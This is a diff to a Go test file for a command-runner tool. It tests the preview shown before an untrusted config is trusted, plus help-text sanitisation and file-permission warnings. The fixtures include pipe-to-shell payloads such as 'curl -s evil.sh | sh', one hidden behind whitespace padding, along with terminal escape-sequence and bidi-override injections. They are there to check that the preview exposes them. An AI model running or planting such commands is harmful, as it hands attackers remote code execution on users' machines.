@@ -4,11 +4,13 @@ import (
 	"bufio"
 	"bytes"
 	"io"
+	"maps"
 	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"testing"
+	"unicode/utf8"
 
 	"github.com/PyratLabs/ugo/internal/config"
 	"github.com/PyratLabs/ugo/internal/trust"
@@ -634,6 +636,25 @@ func TestBuildLong(t *testing.T) {
 	}
 }
 
+func TestBuildLongHidesUnsafeGlobMatches(t *testing.T) {
+	dir := t.TempDir()
+	for _, f := range []string{"my env.yaml", "prod.yaml"} {
+		if err := os.WriteFile(filepath.Join(dir, f), nil, 0644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	arg := config.Argument{Name: "env", Match: filepath.Join(dir, "*.yaml")}
+
+	// Validate rejects "my env", so help must not offer it.
+	if got := buildLong([]config.Argument{arg}, nil); !strings.Contains(got, "prod") || strings.Contains(got, "my env") {
+		t.Errorf("help should list only shell-safe matches, got %q", got)
+	}
+	arg.Raw = true
+	if got := buildLong([]config.Argument{arg}, nil); !strings.Contains(got, "my env") {
+		t.Errorf("raw argument help should list every match, got %q", got)
+	}
+}
+
 // runVerb writes configYAML to a temp <binaryName>.yaml, builds the root
 // command, runs the given args, and returns captured stdout. It sandboxes HOME
 // (so the trust store and global config live in a temp dir) and passes --trust
@@ -712,7 +733,7 @@ func gate(localPath, storePath, answer string, allow, interactive bool) (string,
 	}
 	var out bytes.Buffer
 	in := bufio.NewReader(strings.NewReader(answer))
-	err = trustGate(localPath, storePath, raw, "", in, &out, allow, interactive)
+	err = trustGate(localPath, storePath, raw, nil, nil, in, &out, allow, interactive)
 	return out.String(), err
 }
 
@@ -734,7 +755,7 @@ func TestTrustGateHashesLoadedBytes(t *testing.T) {
 
 	var out bytes.Buffer
 	in := bufio.NewReader(strings.NewReader("y\n"))
-	if err := trustGate(localPath, storePath, raw, "", in, &out, false, true); err != nil {
+	if err := trustGate(localPath, storePath, raw, nil, nil, in, &out, false, true); err != nil {
 		t.Fatalf("trustGate: %v", err)
 	}
 
@@ -838,7 +859,7 @@ func TestTrustGate(t *testing.T) {
 		// trust.
 		var out bytes.Buffer
 		in := bufio.NewReader(strings.NewReader("y"))
-		if err := trustGate(localPath, storePath, raw, "", in, &out, false, true); err == nil || !strings.Contains(err.Error(), "aborting") {
+		if err := trustGate(localPath, storePath, raw, nil, nil, in, &out, false, true); err == nil || !strings.Contains(err.Error(), "aborting") {
 			t.Errorf("expected denial on EOF without newline, got %v", err)
 		}
 		store, err := trust.Load(storePath)
@@ -857,10 +878,10 @@ func TestTrustGate(t *testing.T) {
 		if err != nil {
 			t.Fatal(err)
 		}
-		preview := "    Commands this file defines:\n      build: echo hi\n"
+		preview := &config.Config{Commands: map[string]config.Command{"build": {Cmd: "echo hi"}}}
 		var out bytes.Buffer
 		in := bufio.NewReader(strings.NewReader("y\n"))
-		if err := trustGate(localPath, storePath, raw, preview, in, &out, false, true); err != nil {
+		if err := trustGate(localPath, storePath, raw, preview, preview, in, &out, false, true); err != nil {
 			t.Fatalf("trustGate: %v", err)
 		}
 		if !strings.Contains(out.String(), "build: echo hi") {
@@ -869,14 +890,14 @@ func TestTrustGate(t *testing.T) {
 
 		// A trusted config and --trust skip the prompt, so no preview is shown.
 		var trusted bytes.Buffer
-		if err := trustGate(localPath, storePath, raw, preview, bufio.NewReader(strings.NewReader("")), &trusted, false, true); err != nil {
+		if err := trustGate(localPath, storePath, raw, preview, preview, bufio.NewReader(strings.NewReader("")), &trusted, false, true); err != nil {
 			t.Fatalf("trusted run: %v", err)
 		}
 		if strings.Contains(trusted.String(), "build: echo hi") {
 			t.Error("trusted run must not print the preview")
 		}
 		var allowed bytes.Buffer
-		if err := trustGate(localPath, storePath, raw, preview, bufio.NewReader(strings.NewReader("")), &allowed, true, false); err != nil {
+		if err := trustGate(localPath, storePath, raw, preview, preview, bufio.NewReader(strings.NewReader("")), &allowed, true, false); err != nil {
 			t.Fatalf("--trust run: %v", err)
 		}
 		if strings.Contains(allowed.String(), "build: echo hi") {
@@ -1128,46 +1149,116 @@ func TestExpandEnv(t *testing.T) {
 }
 
 func TestTrustPreview(t *testing.T) {
-	local := &config.Config{Commands: map[string]config.Command{
-		"build": {Cmd: "go build ./..."},
-		"multi": {Cmds: []string{"echo one", "echo two"}},
-		"long":  {Cmd: strings.Repeat("x", 200)},
-		"nop":   {},
-		"gone":  {Cmd: "echo gone"},
-	}}
+	local := &config.Config{
+		ShellOptions: "curl -s evil.sh | sh",
+		Commands: map[string]config.Command{
+			"build":     {Cmd: "go build ./...", Env: map[string]string{"PATH": "./bin", "CGO_ENABLED": "0"}},
+			"multi":     {Cmds: []string{"echo one", "echo two"}},
+			"blank":     {Cmds: []string{"", "  ", "curl evil | sh"}},
+			"padded":    {Cmd: "make build" + strings.Repeat(" ", 95) + "; curl evil|sh"},
+			"long":      {Cmd: strings.Repeat("x", 99) + "é" + strings.Repeat("y", 50)},
+			"nop":       {},
+			"gone":      {Cmd: "echo gone"},
+			"help":      {Cmd: "echo reserved"},
+			"zz\x1b[2A": {Cmd: "echo forged"},
+		},
+		Tools: map[string]config.Tool{
+			"go":   {VersionCmd: "go version"},
+			"make": {},
+		},
+	}
 	// Effective config: platform resolution removed "gone".
-	effective := &config.Config{Commands: map[string]config.Command{
-		"build": {Cmd: "go build ./..."},
-		"multi": {Cmds: []string{"echo one", "echo two"}},
-		"long":  {Cmd: strings.Repeat("x", 200)},
-		"nop":   {},
-	}}
+	effective := &config.Config{Commands: maps.Clone(local.Commands)}
+	delete(effective.Commands, "gone")
 
 	got := trustPreview(local, effective)
 	for _, want := range []string{
+		"shell_options (prepended to every command, global ones too): curl -s evil.sh | sh",
 		"build: go build ./...",
-		"multi: echo one (+1 more commands)",
+		"env: CGO_ENABLED=0 PATH=./bin",
+		"multi: echo one (+1 more lines)",
+		// A blank first item must not hide the rest.
+		"blank: curl evil | sh",
+		// Whitespace padding must not push a payload out of view.
+		"padded: make build ; curl evil|sh",
+		"… (+50 chars)",
 		"nop: (no-op)",
 		"gone: (no command on this platform)",
+		"Tool version commands (run by check):\n      go: go version\n",
 	} {
 		if !strings.Contains(got, want) {
 			t.Errorf("preview missing %q:\n%s", want, got)
 		}
 	}
-	if !strings.Contains(got, "…") {
-		t.Errorf("long command should be truncated in preview:\n%s", got)
-	}
-	if i := strings.Index(got, "long: "); i >= 0 {
-		if line := got[i:]; strings.Contains(line[:strings.Index(line, "\n")], strings.Repeat("x", 101)) {
-			t.Error("truncated line must not include 101st character")
+	for _, unwanted := range []string{"reserved", "forged", "\x1b", "make:"} {
+		if strings.Contains(got, unwanted) {
+			t.Errorf("preview must not contain %q:\n%s", unwanted, got)
 		}
+	}
+	if !utf8.ValidString(got) {
+		t.Errorf("truncation must not split a rune:\n%q", got)
 	}
 
 	if p := trustPreview(nil, effective); p != "" {
 		t.Errorf("nil local config: preview = %q, want empty", p)
 	}
 	if p := trustPreview(&config.Config{}, effective); p != "" {
-		t.Errorf("no local commands: preview = %q, want empty", p)
+		t.Errorf("empty local config: preview = %q, want empty", p)
+	}
+}
+
+func TestSkipReason(t *testing.T) {
+	sensitive := func(name string) config.Command {
+		return config.Command{Prompts: []config.Prompt{{Name: name, Sensitive: true}}}
+	}
+	tests := []struct {
+		name string
+		def  config.Command
+		skip bool
+	}{
+		{"build", config.Command{}, false},
+		{"help", config.Command{}, true},
+		{"version 2.0", config.Command{}, true},
+		{"", config.Command{}, true},
+		{"tab\tname", config.Command{}, true},
+		{"nbsp\u00a0name", config.Command{}, true},
+		{"esc\x1bname", config.Command{}, true},
+		{"bu\u202eild", config.Command{}, true},
+		{"c1\x9bname", config.Command{}, true},
+		{"deploy", sensitive("api_key"), false},
+		{"deploy", sensitive("api-key"), true},
+		// Non-sensitive prompts expand on the Go side, so any name works.
+		{"deploy", config.Command{Prompts: []config.Prompt{{Name: "api-key"}}}, false},
+	}
+	for _, tt := range tests {
+		if got := skipReason(tt.name, tt.def) != ""; got != tt.skip {
+			t.Errorf("skipReason(%q, %+v) skip = %v, want %v", tt.name, tt.def.Prompts, got, tt.skip)
+		}
+	}
+}
+
+func TestHelpTextSanitized(t *testing.T) {
+	c := buildCommand("build", config.Command{
+		Description: "Build\x1b]0;pwned\a",
+		Arguments:   []config.Argument{{Name: "a\x1b[2Jb"}},
+	})
+	for field, v := range map[string]string{"Short": c.Short, "Use": c.Use} {
+		if strings.ContainsAny(v, "\x1b\a") {
+			t.Errorf("%s not sanitized: %q", field, v)
+		}
+	}
+
+	root := &cobra.Command{Use: "x"}
+	verbs := map[string]*cobra.Command{"build": c}
+	cfg := &config.Config{
+		Commands: map[string]config.Command{"build": {Group: "g"}},
+		Groups:   []config.Group{{Name: "g", Description: "Dev\x1b[2J"}},
+	}
+	applyGroups(root, verbs, cfg)
+	for _, g := range root.Groups() {
+		if strings.Contains(g.Title, "\x1b") {
+			t.Errorf("group title not sanitized: %q", g.Title)
+		}
 	}
 }
 
@@ -1186,6 +1277,10 @@ func TestWarnIfWritableByOthers(t *testing.T) {
 		return buf.String()
 	}
 
+	if runtime.GOOS == "windows" {
+		t.Skip("mode bits are not meaningful on Windows")
+	}
+
 	permissive := filepath.Join(dir, "permissive.json")
 	if err := os.WriteFile(permissive, nil, 0600); err != nil {
 		t.Fatal(err)
@@ -1195,6 +1290,29 @@ func TestWarnIfWritableByOthers(t *testing.T) {
 	}
 	if out := captureStderr(func() { warnIfWritableByOthers(permissive, "test consequence") }); !strings.Contains(out, "writable by other users") {
 		t.Errorf("expected warning for 0666 file, got %q", out)
+	}
+
+	// Group-write is the umask-002 default on user-private-group systems.
+	group := filepath.Join(dir, "group.json")
+	if err := os.WriteFile(group, nil, 0600); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(group, 0o664); err != nil {
+		t.Fatal(err)
+	}
+	if out := captureStderr(func() { warnIfWritableByOthers(group, "test consequence") }); out != "" {
+		t.Errorf("no warning expected for 0664 file, got %q", out)
+	}
+
+	worldDir := filepath.Join(dir, "world")
+	if err := os.Mkdir(worldDir, 0700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Chmod(worldDir, 0o777); err != nil {
+		t.Fatal(err)
+	}
+	if out := captureStderr(func() { warnIfWritableByOthers(worldDir, "test consequence") }); !strings.Contains(out, "writable by other users") {
+		t.Errorf("expected warning for 0777 directory, got %q", out)
 	}
 
 	private := filepath.Join(dir, "private.json")
